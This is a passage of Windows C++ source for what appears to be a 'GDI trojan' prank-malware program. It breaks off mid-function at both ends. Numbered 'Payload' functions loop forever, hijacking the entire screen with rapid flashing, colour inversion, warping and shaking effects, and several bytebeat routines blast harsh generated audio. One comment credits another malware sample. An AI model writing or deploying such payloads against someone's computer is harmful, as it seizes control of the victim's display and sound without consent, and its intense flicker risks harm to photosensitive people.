		HFONT font = CreateFont(a, a / 2, rand() % 3600, 0, rand() % 901, 0, 0, 0, ANSI_CHARSET, OUT_CHARACTER_PRECIS, CLIP_CHARACTER_PRECIS, rand() % 5, (rand() % 5 << 4), L"Frekoda");
		SelectObject(hdcCopy, font);
		TextOutA(hdcCopy, rand() % w, rand() % h, text[tmp], strlen(text[tmp]));
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteObject(font);
		Sleep(100);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload8_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = -h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int fx = ((x ^ y) & (y - x)) + ((i ^ x | 9 - y) ^ i) | (w + h);
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 4444.f + y / h * .2f, 1.01f);
				if (hslcolor.s < 1.f) { hslcolor.s += .1f; }
				if (hslcolor.l < .4f) { hslcolor.l += .2f; }
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, NOTSRCCOPY);
		ReleaseDC(NULL, hdc);
		SelectObject(hdcCopy, bmpCopy);
		Sleep(1);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0x00;
}
DWORD WINAPI Payload8_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), mazelarper_s_dick_num = 0;
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hdcCopy, 0, 0, w, h, hdcCopy, mazelarper_s_dick_num - w, 0, SRCCOPY);
		BitBlt(hdcCopy, -mazelarper_s_dick_num, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		BitBlt(hdcCopy, 0, 0, w, h, hdcCopy, 0, mazelarper_s_dick_num - h, NOTSRCCOPY);
		BitBlt(hdcCopy, 0, -mazelarper_s_dick_num, w, h, hdcCopy, 0, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		mazelarper_s_dick_num++;
		if (h <= mazelarper_s_dick_num) { mazelarper_s_dick_num = 0; }
		ReleaseDC(0, hdc);
		Sleep(99);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload9_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0;
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				float fx = floorl((i ^ 4) + (i * 4) * (logbl(y - x + y & y * x + y * y ^ y + x * y * y)) - (powl(i * x - y, 6.f / 9.f)));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / static_cast<float>(h) * 0.15f, 1.0f);
				hslcolor.s = fmod(hslcolor.s + (x % 20) / 200.0f, 1.0f);
				hslcolor.l = fmod(hslcolor.l + (y % 10) / 100.0f, 1.0f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload10_num1(LPVOID lpParam)
{
	int qi = 0, j = 0, k = 1, w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	LPVOID MyMemoryAddress = VirtualAlloc(0, (w * h + w) * sizeof(ColorTemp), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	ColorTemp* data = (ColorTemp*)MyMemoryAddress;
	HDC hdc = GetDC(0), hdcCopy = CreateCompatibleDC(hdc);
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = -h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, NULL, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		j += k;
		hdc = GetDC(0);
		GetDIBits(hdcCopy, bmp, 0, h, data, &bmpi, DIB_RGB_COLORS);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = i % w - w / 2, y = i / w - h / 2;
			float angle = atan2f((1 - x), y) * 180 / EE, radius = (cbrt(x + y + i) - cot(x * y));
			int color_val = int(angle * 2 + radius + qi) % 768;
			ColorTemp vortex;
			if (color_val < 256) {
				vortex.r = color_val + 1;
				vortex.g = 0;
				vortex.b = 91;
			}
			else if (color_val < 512) {
				vortex.r = 78;
				vortex.g = color_val;
				vortex.b = color_val;
			}
			else {
				vortex.r = color_val - 512;
				vortex.g = color_val - 512;
				vortex.b = 13;
			}
			BYTE alpha = (31 * asin(sinf(radius / 25.f))) - 16;
			COLORREF result = BlendPixel(
				RGB(data[i].r, data[i].g, data[i].b),
				RGB(vortex.r, vortex.g, vortex.b),
				alpha
			);
			data[i].r = GetRValue(result);
			data[i].g = GetGValue(result);
			data[i].b = GetBValue(result);
		}
		SetDIBitsToDevice(hdcCopy, 0, 0, w, h, 0, 0, 0, h, data, &bmpi, DIB_RGB_COLORS);
		BLENDFUNCTION blend = { AC_SRC_OVER, 0, 80, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(0, hdc);
		qi += 24;
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	VirtualFree(MyMemoryAddress, 0, MEM_RELEASE);
	return 0;
}
DWORD WINAPI Payload11_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = -h;
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = i / w, y = i % w;
			rgbScreen[i].rgb = ((y ^ x) & ((x - y) + i)) - (x + y | x - y) * RGB(GetRValue(Hue(256)), GetGValue(Hue(256)), GetBValue(Hue(256)));
		}
		BLENDFUNCTION blend = { AC_SRC_OVER, 0, 80, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload11_num2(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HDC hdc = GetDC(NULL);
	POINT ps[4], pt[4];
	for (int ctlIndex = 0; ctlIndex < 4; ctlIndex++) {
		ps[ctlIndex].x = rand() % (w - 200) + 50, ps[ctlIndex].y = rand() % (h - 200) + 50;
		pt[ctlIndex].x = rand() % 20 + 1, pt[ctlIndex].y = rand() % 20 + 1;
	}
	while (true)
	{
		hdc = GetDC(0);
		HPEN hpen = CreatePen(PS_SOLID, 15, RndRGB);
		HGDIOBJ hpenCopy = SelectObject(hdc, hpen);
		for (int i = 0; i < 4; i++) {
			ps[i].x += pt[i].x, ps[i].y += pt[i].y;
			if (ps[i].x <= 0 || ps[i].x >= w) pt[i].x *= (-1);
			if (ps[i].y <= 0 || ps[i].y >= h) pt[i].y *= (-1);
		}
		PolyBezier(hdc, ps, 4);
		SelectObject(hdc, hpenCopy);
		DeleteObject(hpen);
		ReleaseDC(NULL, hdc);
		Sleep(22.22);
	}
	return 0;
}
DWORD WINAPI Payload12_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0;
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = -h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x, g = (rgbquad[i].rgbBlue + rgbquad[i].rgbGreen + rgbquad[i].rgbRed) / 4;
				double fx = ((i ^ 4) + (i * 4) * roundf(cbrtf(g * (x & y | x ^ y | x >> y | x | y | x + y | x - y | x * y))));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 5000.f + y / h * .1f, .6f);
				hslcolor.s = 1.f;
				if (hslcolor.l < .4f) { hslcolor.l += .2f; }
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		ShakingBlt(hdcCopy, 4, 6, w, h, SRCCOPY);
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, NOTSRCCOPY);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload12_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	while (true)
	{
		hdc = GetDC(0);
		HBRUSH hbrush = CreateSolidBrush(RndRGB);
		HGDIOBJ hbrushCopy = SelectObject(hdc, hbrush);
		BitBlt(hdc, rand() % w, rand() % h, rand() % w, rand() % h, hdc, rand() % w, rand() % h, SRCBRUSH);
		BitBlt(hdc, rand() % w, rand() % h, rand() % w, rand() % h, hdc, rand() % w, rand() % h, NOTSRCCOPY);
		SelectObject(hdc, hbrushCopy);
		DeleteObject(hbrush);
		ReleaseDC(0, hdc);
		Sleep(99);
	}
	return 0;
}
DWORD WINAPI Payload13_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(0), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w, av = trunc((rgbScreen[i].b + rgbScreen[i].r + rgbScreen[i].g) / 4);
			rgbScreen[i].r = av;
			rgbScreen[i].g = av;
			rgbScreen[i].b = av;
			rgbScreen[i].rgb += ((x ^ y & (x - y)) + (av * 0.01));
		}
		HPEN hpen = CreatePen(PS_SOLID, 10, RndRGB);
		HGDIOBJ hpenCopy = SelectObject(hdcCopy, hpen);
		MoveToEx(hdcCopy, 10, rand() % h, NULL);
		LineTo(hdcCopy, w, rand() % h);
		MoveToEx(hdcCopy, rand() % h, 10, NULL);
		LineTo(hdcCopy, rand() % w, h);
		SelectObject(hdcCopy, hpenCopy);
		DeleteObject(hpen);
		StretchBlt(hdcCopy, 0, -20, w, h + 40, hdcCopy, 0, 0, w, h, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload14_num1(LPVOID lpParam)//credits to TELEPATHII, but i modified it
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0;
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int fx = (i * 4) * floorf(acos(cosf((x * x) / 50333.f)) * asin(sinf((y * y) / 24678.f)));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 100.f + y / h * .2f, 1.f);
				hslcolor.s = 1.f;
				if (hslcolor.l < 1.9178f) { hslcolor.l += 1.7891f; }
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload14_num2(LPVOID lparam) {
	HDC hdc = GetDC(0), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	RECT rect;
	POINT pos[3];
	while (true) {
		hdc = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &rect);
		int counter = 90;
		if (rand() % 2 == 0) {
			pos[0].x = rect.left + counter;
			pos[0].y = rect.top - counter;
			pos[1].x = rect.right + counter;
			pos[1].y = rect.top + counter;
			pos[2].x = rect.left - counter;
			pos[2].y = rect.bottom - counter;
			PlgBlt(hdc, pos, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		}
		else if (rand() % 2 == 1) {
			pos[0].x = rect.left - counter;
			pos[0].y = rect.top + counter;
			pos[1].x = rect.right - counter;
			pos[1].y = rect.top - counter;
			pos[2].x = rect.left + counter;
			pos[2].y = rect.bottom + counter;
			PlgBlt(hdc, pos, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		}
		PlgBlt(hdcCopy, pos, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, NOTSRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload14_num3(LPVOID lparam) {
	HDC hdc = GetDC(0), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	RECT rect;
	POINT pos[3];
	while (true) {
		hdc = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &rect);
		int c = 100;
		if (rand() % 2 == 0) {
			pos[0].x = rect.left + rand() % 150 - 70;
			pos[0].y = rect.top + rand() % 260 - 190;
			pos[1].x = rect.right + rand() % 310 - 150;
			pos[1].y = rect.top + rand() % 610 - 240;
			pos[2].x = rect.left + c - rand() % 250 - c;
			pos[2].y = rect.bottom - c + rand() % 290 - c;
			PlgBlt(hdc, pos, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		}
		else if (rand() % 2 == 1) {
			pos[0].x = rect.left - rand() % 120 + 56;
			pos[0].y = rect.top - rand() % 216 + 150;
			pos[1].x = rect.right - rand() % 290 + 190;
			pos[1].y = rect.top - rand() % 416 + 250;
			pos[2].x = rect.left - c + rand() % 230 + c;
			pos[2].y = rect.bottom + c - rand() % 240 + c;
			PlgBlt(hdc, pos, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		}
		PlgBlt(hdcCopy, pos, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, NOTSRCERASE);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload15_num1(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		DWORD rop[15] = { SRCCOPY, SRCPAINT, SRCAND, SRCINVERT, MERGECOPY, MERGEPAINT, NOTSRCCOPY, NOTSRCERASE, PATCOPY, PATPAINT, PATINVERT, DSTINVERT, RGBBRUSH, SRCBRUSH, 0x999999 };
		HBRUSH hbrush = CreateSolidBrush(RndRGB);
		HGDIOBJ hbrushCopy = SelectObject(hdcCopy, hbrush);
		for (int i = 0; i < 5; i++) {
			int x = (w / 2) - rand() % w, y = (rand() % 100) - 50;
			BitBlt(hdcCopy, x, 0, w, h, hdcCopy, x, y, SRCCOPY);
			PatBlt(hdcCopy, x, y, x, w, PATINVERT);
		}
		StretchBlt(hdcCopy, w / 6 * (rand() % 6), h / 6 * (rand() % 6), w / 6, h / 6, hdcCopy, rand() % w, rand() % h, rand() % w, rand() % h, rop[rand() % 15]);
		StretchBlt(hdcCopy, w / 6 * (rand() % 6), h / 6 * (rand() % 6), w / 6, h / 6, hdcCopy, rand() % w, rand() % h, rand() % w, rand() % h, rop[rand() % 15]);
		StretchBlt(hdcCopy, w / 6 * (rand() % 6), h / 6 * (rand() % 6), w / 6, h / 6, hdcCopy, rand() % w, rand() % h, rand() % w, rand() % h, rop[rand() % 15]);
		StretchBlt(hdcCopy, w / 6 * (rand() % 6), h / 6 * (rand() % 6), w / 6, h / 6, hdcCopy, rand() % w, rand() % h, rand() % w, rand() % h, rop[rand() % 15]);
		StretchBlt(hdcCopy, w / 6 * (rand() % 6), h / 6 * (rand() % 6), w / 6, h / 6, hdcCopy, rand() % w, rand() % h, rand() % w, rand() % h, rop[rand() % 15]);
		BlockBlt(hdcCopy, w, h, rand() % 500 + 168, rop[rand() % 15]);
		ShakingBlt(hdcCopy, 9, 9, w, h, MERGECOPY);
		SelectObject(hdcCopy, hbrushCopy);
		DeleteObject(hbrush);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
VOID WINAPI bytebeat1() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((sin(t * PI * cos(t | 5) * .015625) * 1.14514)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat2() {
	int nSamplesPerSec = 16000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((tan(t * PI * cos(t | 6) * .012345) / 2)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat3() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * t << (0x20240630 >> (t >> 11)) * (t + 2) >> (t & 16384 ? 7 : 8) + (t & 11451 ? 41 : 91)) ^ t);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat4() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((((t * (1 - (t | t >> 14) ^ (t >> (t & (t >> 5 & t >> 10)))) / ((t >> 11) + 4))))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat5() {//used in kelp spreader.exe, but modified
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t ^ (t * (int(tan(t >> 7 | t >> 8)) & 91)) + (78 * t)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
